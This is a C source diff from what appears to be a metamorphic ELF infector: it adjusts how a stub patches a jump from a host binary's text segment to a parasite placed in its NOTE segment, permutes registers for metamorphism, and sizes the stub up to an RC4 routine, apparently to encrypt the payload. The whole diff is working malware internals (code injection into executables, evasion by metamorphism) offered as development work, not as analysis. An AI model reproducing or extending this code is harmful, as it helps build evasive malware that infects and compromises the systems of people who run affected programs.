@@ -12,7 +12,7 @@ __attribute__((always_inline)) static inline void metamorph_stub(void)
 	const struct s_metamorph metamorph =
 	{
 		{RAX, RDI, RSI, RDX, RCX},
-		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9},
+		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
 	};
 
 	for (register size_t index = 0; index < OFFSET_SIZE; index++)
@@ -30,20 +30,15 @@ __attribute__((always_inline)) static inline void patch_stub(Elf64_Phdr **segmen
 	const size_t size = sizeof(int);
 	const size_t stub_size = (void *)__exit - (void *)L1;
 
-	const size_t stub_addr = ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - stub_size) - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (STUB_OFFSET + JUMP_SIZE)));
-
-	_memcpy(stub + STUB_OFFSET, &stub_addr, size);
-	_memcpy(stub + STUB_SIZE_OFFSET, &stub_size, size);
-
 	const size_t parasite_addr = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (PARASITE_OFFSET + JUMP_SIZE)));
 	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
 
 	_memcpy(stub + PARASITE_OFFSET, &parasite_addr, size);
 	_memcpy(stub + PARASITE_SIZE_OFFSET, &parasite_size, size);
 
-	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));
+	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (JUMP_OFFSET + JUMP_SIZE)));
 
-	_memcpy(stub + (stub_size - JUMP_SIZE), &patch_jump, size);
+	_memcpy(stub + JUMP_OFFSET, &patch_jump, size);
 }
 
 __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
@@ -69,7 +64,7 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	if (context == FAILURE)
 		goto label;
 
-	const size_t stub_size = (void *)__exit - (void *)L1;
+	const size_t stub_size = (void *)RC4 - (void *)L1;
 	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
 
 	metamorph_stub();
